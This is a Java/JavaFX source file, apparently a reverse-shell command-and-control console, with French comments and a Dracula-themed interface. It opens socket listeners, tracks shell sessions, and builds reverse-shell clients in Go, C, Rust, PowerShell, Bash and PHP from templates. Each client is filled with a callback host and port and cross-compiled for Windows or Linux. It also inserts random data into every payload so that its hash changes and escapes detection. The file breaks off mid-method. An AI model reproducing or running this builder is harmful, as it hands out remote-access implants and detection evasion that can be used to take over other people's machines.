import javafx.application.Application;
import javafx.application.Platform;
import javafx.beans.property.SimpleStringProperty;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.control.cell.PropertyValueFactory;
import javafx.scene.input.MouseButton;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import javafx.stage.FileChooser;
import javafx.stage.Modality;
import javafx.stage.Stage;
import javafx.stage.DirectoryChooser; // Ajoutez cette ligne
import javafx.stage.FileChooser; // Ajoutez cette ligne

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.Random;
import java.util.UUID;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;

import javafx.scene.control.ToggleGroup;
import javafx.scene.control.RadioButton;

public class Main extends Application {
    private TextArea eventViewer;
    private TabPane consoleTabs;
    private ObservableList<ListenerEntry> listenerList = FXCollections.observableArrayList();
    private ObservableList<ShellSession> shellSessions = FXCollections.observableArrayList();
    private TableView<ShellSession> sessionsTable;
    private final SecureRandom random = new SecureRandom();
    private ObservableList<ServerEntry> serverList = FXCollections.observableArrayList();
    private List<Process> serverProcesses = new ArrayList<>();
    
    // Variable statique pour stocker la dernière adresse IP utilisée pour générer un payload
    private static String lastPayloadIp;
    
    // Dracula theme colors
    private static final String DRACULA_BACKGROUND = "#282a36";
    private static final String DRACULA_CURRENT_LINE = "#44475a";
    private static final String DRACULA_FOREGROUND = "#f8f8f2";
    private static final String DRACULA_COMMENT = "#6272a4";
    private static final String DRACULA_CYAN = "#8be9fd";
    private static final String DRACULA_GREEN = "#50fa7b";
    private static final String DRACULA_ORANGE = "#ffb86c";
    private static final String DRACULA_PINK = "#ff79c6";
    private static final String DRACULA_PURPLE = "#bd93f9";
    private static final String DRACULA_RED = "#ff5555";
    private static final String DRACULA_YELLOW = "#f1fa8c";
    
    // Applique le style Dracula à un nœud JavaFX
    private void applyDraculaStyle(Region node) {
        node.setStyle(
            "-fx-background-color: " + DRACULA_BACKGROUND + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";"
        );
    }
    
    // Applique le style Dracula à un contrôle de texte
    private void applyDraculaTextStyle(TextInputControl control) {
        control.setStyle(
            "-fx-font-family: 'Monospace';" +
            "-fx-font-size: 12px;" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-control-inner-background: " + DRACULA_BACKGROUND + ";" +
            "-fx-highlight-fill: " + DRACULA_PURPLE + ";" +
            "-fx-highlight-text-fill: " + DRACULA_FOREGROUND + ";"
        );
    }
    
    // Applique le style Dracula à une table
    private void applyDraculaTableStyle(TableView<?> table) {
        table.setStyle(
            "-fx-background-color: " + DRACULA_BACKGROUND + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-control-inner-background: " + DRACULA_BACKGROUND + ";" +
            "-fx-table-cell-border-color: " + DRACULA_CURRENT_LINE + ";" +
            "-fx-table-header-border-color: " + DRACULA_CURRENT_LINE + ";" +
            "-fx-border-color: " + DRACULA_COMMENT + ";" +
            "-fx-border-width: 1px;"
        );
        
        // Appliquer le style aux en-têtes de colonne
        table.getStylesheets().add("file:res/styles/table-styles.css");
    }

    // Applique le style Dracula à un bouton
    private void applyDraculaButtonStyle(Button button) {
        button.setStyle(
            "-fx-background-color: " + DRACULA_PURPLE + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-font-weight: bold;" +
            "-fx-cursor: hand;" +
            "-fx-padding: 8px 16px;" +
            "-fx-background-radius: 4px;" +
            "-fx-border-color: " + DRACULA_CURRENT_LINE + ";" +
            "-fx-border-width: 1px;"
        );
        
        // Ajouter des effets lors du survol et du clic
        button.setOnMouseEntered(e -> 
            button.setStyle(
                "-fx-background-color: " + DRACULA_PINK + ";" +
                "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
                "-fx-font-weight: bold;" +
                "-fx-cursor: hand;" +
                "-fx-padding: 8px 16px;" +
                "-fx-background-radius: 4px;" +
                "-fx-border-color: " + DRACULA_CYAN + ";" +
                "-fx-border-width: 1px;"
            )
        );
        
        button.setOnMouseExited(e -> 
            button.setStyle(
                "-fx-background-color: " + DRACULA_PURPLE + ";" +
                "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
                "-fx-font-weight: bold;" +
                "-fx-cursor: hand;" +
                "-fx-padding: 8px 16px;" +
                "-fx-background-radius: 4px;" +
                "-fx-border-color: " + DRACULA_CURRENT_LINE + ";" +
                "-fx-border-width: 1px;"
            )
        );
    }
    
    // Applique le style Dracula à une scène
    private void applyDraculaSceneStyle(Scene scene) {
        scene.getRoot().setStyle("-fx-base: " + DRACULA_BACKGROUND + ";");
        // Ajout de la feuille de style CSS globale
        scene.getStylesheets().add("file:res/styles/table-styles.css");
    }
    
    // Applique le style Dracula à une fenêtre modale
    private void applyDraculaStageStyle(Stage stage) {
        // Sera appliqué à travers la scène
    }

    // Applique le style Dracula à un menu contextuel
    private void applyDraculaContextMenuStyle(ContextMenu menu) {
        menu.setStyle(
            "-fx-background-color: " + DRACULA_BACKGROUND + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";"
        );
    }
    
    // Applique le style Dracula à un élément de menu
    private void applyDraculaMenuItemStyle(MenuItem item) {
        item.setStyle(
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";"
        );
    }
    
    // Applique le style Dracula à un bouton radio
    private void applyDraculaRadioButtonStyle(RadioButton button) {
        button.setStyle(
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";"
        );
    }
    
    // Applique le style Dracula à une alerte
    private void applyDraculaAlertStyle(Alert alert) {
        DialogPane dialogPane = alert.getDialogPane();
        dialogPane.setStyle(
            "-fx-background-color: " + DRACULA_BACKGROUND + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";"
        );
        
        // Appliquer le style aux boutons
        dialogPane.getButtonTypes().stream()
            .map(dialogPane::lookupButton)
            .forEach(button -> applyDraculaButtonStyle((Button)button));
        
        // Appliquer le style à l'en-tête
        Label headerLabel = (Label) dialogPane.lookup(".header-panel .label");
        if (headerLabel != null) {
            headerLabel.setStyle("-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold;");
        }
        
        // Appliquer le style au contenu
        Label contentLabel = (Label) dialogPane.lookup(".content.label");
        if (contentLabel != null) {
            contentLabel.setStyle("-fx-text-fill: " + DRACULA_FOREGROUND + ";");
        }
        
        // Appliquer le style à la scène du dialogue
        Scene scene = dialogPane.getScene();
        if (scene != null) {
            applyDraculaSceneStyle(scene);
        }
    }

    // Applique le style Dracula à une ComboBox
    private void applyDraculaComboBoxStyle(ComboBox<?> comboBox) {
        comboBox.setStyle(
            "-fx-background-color: " + DRACULA_CURRENT_LINE + ";" +
            "-fx-text-fill: " + DRACULA_FOREGROUND + ";" +
            "-fx-prompt-text-fill: " + DRACULA_COMMENT + ";" +
            "-fx-font-family: 'Monospace';" +
            "-fx-font-size: 12px;" +
            "-fx-border-color: " + DRACULA_PURPLE + ";" +
            "-fx-border-width: 1px;" +
            "-fx-border-radius: 3px;"
        );
    }

    public static class ListenerEntry {
        private final int port;
        private final ServerSocket serverSocket;

        public ListenerEntry(int port, ServerSocket serverSocket) {
            this.port = port;
            this.serverSocket = serverSocket;
        }

        public int getPort() {
            return port;
        }

        public ServerSocket getServerSocket() {
            return serverSocket;
        }
    }

    private String getExtensionForType(String type) {
        switch (type.toLowerCase()) {
            case "golang":
                return ".go";
            case "c":
                return ".c";
            case "rust":
                return ".rs";
            case "powershell":
                return ".ps1";
            case "bash":
                return ".sh";
            case "php":
                return ".php";
            default:
                return ".txt";
        }
    }

    /**
     * Génère une chaîne de caractères aléatoire qui sera intégrée dans les payloads
     * pour éviter d'avoir le même hash à chaque génération
     */
    private String generateRandomData() {
        // Génère un identifiant unique
        String uuid = UUID.randomUUID().toString();
        
        // Ajoute un tableau d'octets aléatoires encodé en base64
        byte[] randomBytes = new byte[32];
        random.nextBytes(randomBytes);
        String randomBase64 = Base64.getEncoder().encodeToString(randomBytes);
        
        // Génère un nombre aléatoire
        int randomNumber = random.nextInt(10000);
        
        return String.format("/* UUID: %s\n   Random: %s\n   Timestamp: %d\n   Number: %d */", 
                uuid, randomBase64, System.currentTimeMillis(), randomNumber);
    }

    /**
     * Insère les données aléatoires dans le code source selon le type de langage
     */
    private String insertRandomDataIntoCode(String code, String payloadType) {
        String randomData = generateRandomData();
        StringBuilder modifiedCode = new StringBuilder(code);
        
        switch (payloadType.toLowerCase()) {
            case "golang":
                // Insérer les données après le package ou avant la première fonction
                int goPosition = code.indexOf("package main");
                if (goPosition != -1) {
                    goPosition = code.indexOf("\n", goPosition) + 1;
                    modifiedCode.insert(goPosition, "\n" + randomData + "\n");
                }
                break;
                
            case "c":
                // Insérer les données après les includes ou avant la première fonction
                int cPosition = code.lastIndexOf("#include");
                if (cPosition != -1) {
                    cPosition = code.indexOf("\n", cPosition) + 1;
                    modifiedCode.insert(cPosition, "\n" + randomData + "\n");
                }
                break;
                
            case "rust":
                // Insérer les données au début du fichier
                int rustPosition = 0;
                modifiedCode.insert(rustPosition, randomData + "\n\n");
                break;
                
            case "powershell":
                // Insérer les données au début du script
                modifiedCode.insert(0, "<#\n" + randomData + "\n#>\n\n");
                break;
                
            case "php":
                // Insérer les données après la balise PHP
                int phpPosition = code.indexOf("<?php");
                if (phpPosition != -1) {
                    phpPosition = code.indexOf("\n", phpPosition) + 1;
                    modifiedCode.insert(phpPosition, "\n// " + randomData.replace("/*", "").replace("*/", "").replaceAll("\n", "\n// ") + "\n");
                }
                break;
                
            case "bash":
                // Insérer les données après le shebang
                int shPosition = code.indexOf("#!/");
                if (shPosition != -1 && code.indexOf("\n", shPosition) != -1) {
                    shPosition = code.indexOf("\n", shPosition) + 1;
                    modifiedCode.insert(shPosition, "\n# " + randomData.replace("/*", "").replace("*/", "").replaceAll("\n", "\n# ") + "\n");
                } else {
                    modifiedCode.insert(0, "# " + randomData.replace("/*", "").replace("*/", "").replaceAll("\n", "\n# ") + "\n\n");
                }
                break;
                
            default:
                // Pour les autres types, ajouter simplement en tant que commentaire au début
                modifiedCode.insert(0, "# " + randomData + "\n\n");
        }
        
        return modifiedCode.toString();
    }

    public static void setLastPayloadIp(String ip) {
        lastPayloadIp = ip;
    }
    
    public static String getLastPayloadIp() {
        return lastPayloadIp;
    }

    public void payloadsParser(String name, String ip, String port, String outputPath, String targetOS, String payloadsType, String goarch) {
        // Enregistrer l'adresse IP utilisée pour ce payload
        setLastPayloadIp(ip);
        
        String templatePath;
        
        // Déterminer l'extension pour le fichier source à générer
        String extension = getExtensionForType(payloadsType);
        
        // Générer un nom temporaire pour le fichier source
        String tempFilename = "temp_" + System.currentTimeMillis() + extension;
        String sourcePath = "output/" + tempFilename;
        
        try {
            // Définir le chemin du template en fonction du type de payload
            switch (payloadsType.toLowerCase()) {
                case "golang":
                    templatePath = "res/payloads/client.go";
                    break;
                case "c":
                    templatePath = "res/payloads/client.c";
                    break;
                case "rust":
                    templatePath = "res/payloads/client.rs";
                    break;
                case "powershell":
                    templatePath = "res/payloads/client.ps1";
                    break;
                case "bash":
                    templatePath = "res/payloads/client.sh";
                    break;
                case "php":
                    templatePath = "res/payloads/client.php";
                    break;
                default:
                    logMessage("[-] Unknown payload type: " + payloadsType);
                    return;
            }

            // Lire et remplacer les variables dans le template
            StringBuilder codeBuilder = new StringBuilder();
            try (BufferedReader reader = Files.newBufferedReader(Paths.get(templatePath))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.replace("{{TARGET_IP}}", ip);
                    line = line.replace("{{TARGET_PORT}}", port);
                    codeBuilder.append(line).append("\n");
                }
            }
            
            // Ajouter des données aléatoires pour rendre chaque payload unique
            String modifiedPayload = insertRandomDataIntoCode(codeBuilder.toString(), payloadsType);

            logMessage("[+] Payload template parsed for " + payloadsType + " at " + ip + ":" + port);

            // Écriture du code source temporaire
            Path sourceFile = Paths.get(sourcePath);
            Files.createDirectories(sourceFile.getParent());
            Files.writeString(sourceFile, modifiedPayload);

            logMessage("[+] Source code saved: " + sourceFile);

            // Compilation en fonction du type
            switch (payloadsType.toLowerCase()) {
                case "golang":
                    compileGo(sourceFile.toString(), outputPath, targetOS.toLowerCase(), goarch);
                    break;
                case "c":
                    compileC(sourceFile.toString(), outputPath, targetOS.toLowerCase(), goarch);
                    break;
                case "rust":
                    compileRust(sourceFile.toString(), outputPath, targetOS.toLowerCase(), goarch);
                    break;
                default:
                    // Pour les types qui ne nécessitent pas de compilation (scripts)
                    // On copie simplement le fichier source vers l'emplacement de sortie
                    Files.copy(sourceFile, Paths.get(outputPath), 
                            java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                    logMessage("[+] Script payload saved: " + outputPath);
                    break;
            }
            
            // Supprimer le fichier source temporaire si nous sommes dans un cas de compilation
            if (payloadsType.equalsIgnoreCase("golang") || 
                payloadsType.equalsIgnoreCase("c") || 
                payloadsType.equalsIgnoreCase("rust")) {
                try {
                    Files.deleteIfExists(sourceFile);
                } catch (IOException e) {
                    // Non critique si on ne peut pas supprimer le fichier temporaire
                    logMessage("[!] Could not delete temporary source file: " + e.getMessage());
                }
            }

        } catch (IOException e) {
            logMessage("[-] Error in payloadsParser: " + e.getMessage());
        }
    }

    private void compileGo(String sourcePath, String outputPath, String goos, String goarch) {
        try {
            ProcessBuilder builder = new ProcessBuilder(
                    "go", "build", "-o", outputPath, sourcePath
            );
            builder.environment().put("GOOS", goos);
            builder.environment().put("GOARCH", goarch);
            builder.redirectErrorStream(true);

            Process process = builder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                logMessage("[Go Build] " + line);
            }

            int exitCode = process.waitFor();
            if (exitCode == 0) {
                logMessage("[+] Compilation success: " + outputPath);
            } else {
                logMessage("[-] Compilation failed with code: " + exitCode);
            }

        } catch (IOException | InterruptedException e) {
            logMessage("[-] Error during Go compilation: " + e.getMessage());
        }
    }
    
    private void compileC(String sourcePath, String outputPath, String targetOS, String arch) {
        try {
            ProcessBuilder builder;
            if (targetOS.equals("windows")) {
                // Cross-compilation pour Windows avec MinGW
                String gccPrefix = arch.equals("386") ? "i686-w64-mingw32-gcc" : "x86_64-w64-mingw32-gcc";
                builder = new ProcessBuilder(
                        gccPrefix, "-o", outputPath, sourcePath, "-lws2_32"
                );
            } else {
                // Compilation standard pour Linux avec spécification d'architecture
                String archFlag = arch.equals("386") ? "-m32" : "-m64";
                builder = new ProcessBuilder(
                        "gcc", archFlag, "-o", outputPath, sourcePath
                );
            }
            
            builder.redirectErrorStream(true);
            Process process = builder.start();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                logMessage("[C Build] " + line);
            }
            
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                logMessage("[+] C compilation success: " + outputPath);
            } else {
                logMessage("[-] C compilation failed with code: " + exitCode);
            }
            
        } catch (IOException | InterruptedException e) {
            logMessage("[-] Error during C compilation: " + e.getMessage());
        }
    }
    
    private void compileRust(String sourcePath, String outputPath, String targetOS, String arch) {
        try {
            // Créer un projet Rust temporaire
            String tempDir = "output/rust_temp";
            Files.createDirectories(Paths.get(tempDir));
            
            // Créer le Cargo.toml
            String cargoToml = 
                    "[package]\n" +
                    "name = \"rshell\"\n" +
                    "version = \"0.1.0\"\n" +
                    "edition = \"2021\"\n\n" +
                    "[dependencies]\n" +
                    "hostname = \"0.3.1\"\n\n" +
                    "[[bin]]\n" +
                    "name = \"rshell\"\n" +
                    "path = \"src/main.rs\"\n";
            
            Files.writeString(Paths.get(tempDir + "/Cargo.toml"), cargoToml);
            
            // Créer le répertoire src
            Files.createDirectories(Paths.get(tempDir + "/src"));
            
            // Copier le fichier source
            Files.copy(Paths.get(sourcePath), Paths.get(tempDir + "/src/main.rs"), 
                    java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            
            // Déterminer le chemin de cargo
            String cargoPath = findCargoPath();
            if (cargoPath == null) {
                logMessage("[-] Error: Could not find cargo executable. Make sure Rust is installed and in your PATH.");
                return;
            }
            
            logMessage("[+] Using cargo from: " + cargoPath);
            
            // Compiler avec cargo
            ProcessBuilder builder;
            if (targetOS.equals("windows")) {
                String target = arch.equals("386") ? "i686-pc-windows-gnu" : "x86_64-pc-windows-gnu";
                builder = new ProcessBuilder(
                        cargoPath, "build", "--release", "--target", target, "--quiet"
                );
            } else {
                // Pour Linux, utiliser la cible appropriée
                if (arch.equals("386")) {
                    builder = new ProcessBuilder(
                            cargoPath, "build", "--release", "--target", "i686-unknown-linux-gnu", "--quiet"
                    );
                } else {
                    builder = new ProcessBuilder(
                            cargoPath, "build", "--release", "--quiet"
                    );
                }
            }
            
            // Copier les variables d'environnement actuelles
            builder.environment().putAll(System.getenv());
            
            // Ajouter les chemins courants pour les binaires
            String path = builder.environment().get("PATH");
            if (path != null) {
                // Ajouter les chemins possibles pour cargo
                builder.environment().put("PATH", path + ":" + 
                                         "/usr/local/bin:" + 
                                         "/usr/bin:" + 
                                         "/bin:" + 
                                         System.getProperty("user.home") + "/.cargo/bin");
            }
            
            builder.directory(new File(tempDir));
            builder.redirectErrorStream(true);
            
            logMessage("[+] Starting Rust compilation...");
            
            Process process = builder.start();
            
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                // Ne pas afficher les logs de compilation en direct
                output.append(line).append("\n");
            }
            
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                // Copier le binaire final vers le chemin spécifié par l'utilisateur
                String binaryPath;
                if (targetOS.equals("windows")) {
                    String target = arch.equals("386") ? "i686-pc-windows-gnu" : "x86_64-pc-windows-gnu";
                    binaryPath = tempDir + "/target/" + target + "/release/rshell.exe";
                } else {
                    if (arch.equals("386")) {
                        binaryPath = tempDir + "/target/i686-unknown-linux-gnu/release/rshell";
                    } else {
                        binaryPath = tempDir + "/target/release/rshell";
                    }
                }
                
                Files.copy(Paths.get(binaryPath), Paths.get(outputPath),
                        java.nio.file.StandardCopyOption.REPLACE_EXISTING);
                
                logMessage("[+] Rust compilation success: " + outputPath);
                
                // Nettoyer le répertoire temporaire
                ProcessBuilder cleanupBuilder = new ProcessBuilder("rm", "-rf", tempDir);
                cleanupBuilder.start();
            } else {
                logMessage("[-] Rust compilation failed with code: " + exitCode);
                // En cas d'échec, afficher les logs pour aider au débogage
                if (output.length() > 0) {
                    logMessage("[-] Compilation error details:");
                    String[] errorLines = output.toString().split("\n");
                    for (String errorLine : errorLines) {
                        if (errorLine.contains("error:") || errorLine.contains("error[E")) {
                            logMessage("    " + errorLine);
                        }
                    }
                }
            }
            
        } catch (IOException | InterruptedException e) {
            logMessage("[-] Error during Rust compilation: " + e.getMessage());
        }
    }

    /**
     * Tente de trouver le chemin complet de l'exécutable cargo
     */
    private String findCargoPath() {
        try {
            // Liste des emplacements possibles de cargo
            String[] possiblePaths = {
                "/usr/bin/cargo",
                "/usr/local/bin/cargo",
                "/bin/cargo",
                System.getProperty("user.home") + "/.cargo/bin/cargo"
            };
            
            // Vérifier si l'un des chemins existe
            for (String path : possiblePaths) {
                if (Files.exists(Paths.get(path))) {
                    return path;
                }
            }
            
            // Essayer de trouver cargo avec "which" (Linux/Mac)
            try {
                Process process = new ProcessBuilder("which", "cargo").start();
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line = reader.readLine();
                if (line != null && !line.isEmpty() && Files.exists(Paths.get(line))) {
                    return line;
                }
            } catch (IOException e) {
                // Ignorer l'erreur et essayer d'autres méthodes
            }
            
            // Dernière tentative: exécuter directement "cargo --version" pour voir si c'est dans le PATH
            try {
                Process process = new ProcessBuilder("cargo", "--version").start();
                int exitCode = process.waitFor();
                if (exitCode == 0) {
                    // Si cargo est dans le PATH, on peut l'utiliser directement
                    return "cargo";
                }
            } catch (InterruptedException e) {
                // Ignorer l'erreur
            }
            
            return null;
        } catch (Exception e) {
            logMessage("[-] Error finding cargo path: " + e.getMessage());
            return null;
        }
    }

    /**
     * Récupère la liste des adresses IP locales de la machine
     */
    private List<String> getLocalIpAddresses() {
        List<String> addresses = new ArrayList<>();
        
        try {
            // Ajouter d'abord l'adresse IP principale
            try {
                InetAddress localHost = InetAddress.getLocalHost();
                if (localHost != null && localHost.getHostAddress() != null) {
                    addresses.add(localHost.getHostAddress());
                }
            } catch (UnknownHostException e) {
                // Ignorer cette erreur et continuer avec les autres interfaces
            }
            
            // Parcourir toutes les interfaces réseau
            Enumeration<NetworkInterface> networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface ni = networkInterfaces.nextElement();
                
                // Ignorer les interfaces loopback et non actives
                if (ni.isLoopback() || !ni.isUp()) {
                    continue;
                }
                
                Enumeration<InetAddress> inetAddresses = ni.getInetAddresses();
                while (inetAddresses.hasMoreElements()) {
                    InetAddress address = inetAddresses.nextElement();
                    
                    // Ne prendre que les IPv4
                    if (address instanceof Inet4Address) {
                        String hostAddress = address.getHostAddress();
                        // Éviter les doublons
                        if (!addresses.contains(hostAddress)) {
                            addresses.add(hostAddress);
                        }
                    }
                }
            }
        } catch (SocketException e) {
            logMessage("[-] Error getting local IP addresses: " + e.getMessage());
        }
        
        // Ajouter l'adresse localhost si on n'a trouvé aucune adresse
        if (addresses.isEmpty()) {
            addresses.add("127.0.0.1");
        }
        
        return addresses;
    }

    /**
     * Récupère la liste des ports des listeners actifs
     */
    private List<String> getActiveListenerPorts() {
        List<String> ports = new ArrayList<>();
        
        for (ListenerEntry listener : listenerList) {
            ports.add(String.valueOf(listener.getPort()));
        }
        
        return ports;
    }

    private void payloadsWindows(String type) {
        Stage payloadStage = new Stage();
        payloadStage.setTitle("Generate " + type + " Payload");
        
        GridPane layout = new GridPane();
        layout.setHgap(15);
        layout.setVgap(15);
        layout.setPadding(new Insets(25));
        applyDraculaStyle(layout);
        
        // Style pour les libellés
        String labelStyle = "-fx-text-fill: " + DRACULA_CYAN + "; -fx-font-weight: bold; -fx-font-size: 14px;";
        
        // Host input (IP or domain)
        Label hostLabel = new Label("Host:");
        hostLabel.setMinWidth(100);
        hostLabel.setStyle(labelStyle);
        
        // Récupérer les adresses IP locales
        List<String> localIps = getLocalIpAddresses();
        
        // Créer un ComboBox avec les adresses IP locales
        ComboBox<String> hostField = new ComboBox<>();
        hostField.setEditable(true); // Permettre à l'utilisateur de saisir une IP ou un domaine personnalisé
        hostField.setPromptText("Enter the listener IP or domain");
        hostField.setPrefWidth(300);
        hostField.getItems().addAll(localIps);
        applyDraculaComboBoxStyle(hostField);
        if (!localIps.isEmpty()) {
            hostField.setValue(localIps.get(0));
        }
        
        layout.add(hostLabel, 0, 0);
        layout.add(hostField, 1, 0);
        
        // Port input
        Label portLabel = new Label("Port:");
        portLabel.setMinWidth(100);
        portLabel.setStyle(labelStyle);
        
        // Récupérer les ports des listeners actifs
        List<String> activePorts = getActiveListenerPorts();
        
        // Créer un ComboBox avec les ports des listeners actifs
        ComboBox<String> portField = new ComboBox<>();
        portField.setEditable(true); // Permettre à l'utilisateur de saisir un port personnalisé
        portField.setPromptText("Enter the listener port");
        portField.getItems().addAll(activePorts);
        applyDraculaComboBoxStyle(portField);
        if (!activePorts.isEmpty()) {
            portField.setValue(activePorts.get(0));
        }
        
        layout.add(portLabel, 0, 1);
        layout.add(portField, 1, 1);
        
        // Define archGroup outside the if block, but initialize it only for Go and C
        ToggleGroup archGroup = new ToggleGroup();
        
        // Architecture selection for Go, C and Rust (not for PHP)
        int currentRow = 2;
        if (type.equals("Golang") || type.equals("C") || type.equals("Rust")) {
            Label archLabel = new Label("Architecture:");
            archLabel.setMinWidth(100);
            archLabel.setStyle(labelStyle);
            layout.add(archLabel, 0, currentRow);
            
            // Radio buttons for architecture
            RadioButton arch32Button = new RadioButton("32 bits");
            arch32Button.setStyle("-fx-text-fill: " + DRACULA_FOREGROUND + "; -fx-font-size: 13px;");
            arch32Button.setToggleGroup(archGroup);
            
            RadioButton arch64Button = new RadioButton("64 bits");
            arch64Button.setStyle("-fx-text-fill: " + DRACULA_FOREGROUND + "; -fx-font-size: 13px;");
            arch64Button.setToggleGroup(archGroup);
            arch64Button.setSelected(true);
            
            HBox archBox = new HBox(20, arch32Button, arch64Button);
            archBox.setAlignment(Pos.CENTER_LEFT);
            layout.add(archBox, 1, currentRow);
            currentRow++;
        }
        
        // Target OS (pas pour PHP, qui est interprété)
        ToggleGroup osGroup = new ToggleGroup();
        
        if (!type.equals("PHP")) {
            Label osLabel = new Label("Target OS:");
            osLabel.setMinWidth(100);
            osLabel.setStyle(labelStyle);
            layout.add(osLabel, 0, currentRow);
            
            // Radio buttons for OS
            RadioButton windowsButton = new RadioButton("Windows");
            windowsButton.setStyle("-fx-text-fill: " + DRACULA_FOREGROUND + "; -fx-font-size: 13px;");
            windowsButton.setToggleGroup(osGroup);
            
            RadioButton linuxButton = new RadioButton("Linux");
            linuxButton.setStyle("-fx-text-fill: " + DRACULA_FOREGROUND + "; -fx-font-size: 13px;");
            linuxButton.setToggleGroup(osGroup);
            windowsButton.setSelected(true);
            
            HBox osBox = new HBox(20, windowsButton, linuxButton);
            osBox.setAlignment(Pos.CENTER_LEFT);
            layout.add(osBox, 1, currentRow);
            currentRow++;
        }
        
        // File selection
        Label saveLabel = new Label("Save to:");
        saveLabel.setStyle(labelStyle);
        saveLabel.setMinWidth(100);
        layout.add(saveLabel, 0, currentRow);
        
        Button chooseFileButton = new Button("Choose output location...");
        applyDraculaButtonStyle(chooseFileButton);
        chooseFileButton.setMinWidth(200);
        
        TextField filePathField = new TextField();
        applyDraculaTextStyle(filePathField);
        filePathField.setEditable(false);
        filePathField.setPromptText("Select where to save the payload");
        
        HBox fileSelectionBox = new HBox(10, filePathField, chooseFileButton);
        HBox.setHgrow(filePathField, Priority.ALWAYS);
        layout.add(fileSelectionBox, 1, currentRow);
        currentRow++;
        
        // Submit button
        Button generateButton = new Button("Generate");
        applyDraculaButtonStyle(generateButton);
        generateButton.setMinWidth(150);
        generateButton.setDisable(true); // Désactivé jusqu'à ce qu'un chemin de fichier soit sélectionné
        
        HBox buttonBox = new HBox();
        buttonBox.setAlignment(Pos.CENTER_RIGHT);
        buttonBox.setPadding(new Insets(15, 0, 0, 0));
        buttonBox.getChildren().add(generateButton);
        layout.add(buttonBox, 1, currentRow);
        
        // Add file chooser functionality
        chooseFileButton.setOnAction(e -> {
            FileChooser fileChooser = new FileChooser();
            fileChooser.setTitle("Save Payload As");
            
            // Set extension filters based on payload type
            String extension = "";
            boolean compiledPayload = type.equals("Golang") || type.equals("C") || type.equals("Rust");
            
            if (type.equals("PHP")) {
                extension = ".php";
                fileChooser.getExtensionFilters().add(
                    new FileChooser.ExtensionFilter("PHP files", "*.php")
                );
            } else if (compiledPayload && osGroup.getSelectedToggle() != null) {
                RadioButton selectedOS = (RadioButton) osGroup.getSelectedToggle();
                if (selectedOS.getText().equals("Windows")) {
                    extension = ".exe";
                    fileChooser.getExtensionFilters().add(
                        new FileChooser.ExtensionFilter("Executable files", "*.exe")
                    );
                } else if (selectedOS.getText().equals("Linux")) {
                    extension = ".elf";
                    fileChooser.getExtensionFilters().add(
                        new FileChooser.ExtensionFilter("ELF files", "*.elf")
                    );
                }
            } else {
                switch (type) {
                    case "Golang":
                        extension = ".go";
                        fileChooser.getExtensionFilters().add(
                            new FileChooser.ExtensionFilter("Go files", "*.go")
                        );
                        break;
                    case "C":
                        extension = ".c";
                        fileChooser.getExtensionFilters().add(
                            new FileChooser.ExtensionFilter("C files", "*.c")
                        );
                        break;
                    case "Rust":
                        extension = ".rs";
                        fileChooser.getExtensionFilters().add(
                            new FileChooser.ExtensionFilter("Rust files", "*.rs")
                        );
                        break;
                }
            }
            
            fileChooser.setInitialFileName("payload" + extension);
            
            // Show save dialog
            File file = fileChooser.showSaveDialog(payloadStage);
            if (file != null) {
                filePathField.setText(file.getAbsolutePath());
                generateButton.setDisable(false);
            }
        });
        
        generateButton.setOnAction(e -> {
            String host = hostField.getValue().trim();
            String port = portField.getValue().trim();
            String filePath = filePathField.getText();
            String fileName = new File(filePath).getName();
            String outputName;
            
            // Enregistrer l'adresse IP utilisée pour ce payload
            setLastPayloadIp(host);
            
            // Retirer l'extension du nom de fichier pour la donner à payloadsParser
            if (fileName.contains(".")) {
                outputName = fileName.substring(0, fileName.lastIndexOf('.'));
            } else {
                outputName = fileName;
            }
            
            String targetOS = "linux"; // Par défaut pour les scripts
            String goarch = "amd64"; // Par défaut
            
            // Pour les types compilés, récupérer les options
            if (type.equals("Golang") || type.equals("C") || type.equals("Rust")) {
                if (osGroup.getSelectedToggle() != null) {
                    RadioButton selectedOS = (RadioButton) osGroup.getSelectedToggle();
                    targetOS = selectedOS.getText().toLowerCase();
                }
                
                if (archGroup.getSelectedToggle() != null) {
                    goarch = ((RadioButton)archGroup.getSelectedToggle()).getText().equals("32 bits") ? "386" : "amd64";
                }
            }
            
            if (host.isEmpty() || port.isEmpty() || filePath.isEmpty()) {
                Alert alert = new Alert(Alert.AlertType.ERROR);
                alert.setTitle("Input Error");
                alert.setHeaderText(null);
                alert.setContentText("Please fill in all fields and select a save location");
                applyDraculaAlertStyle(alert);
                alert.showAndWait();
                return;
            }
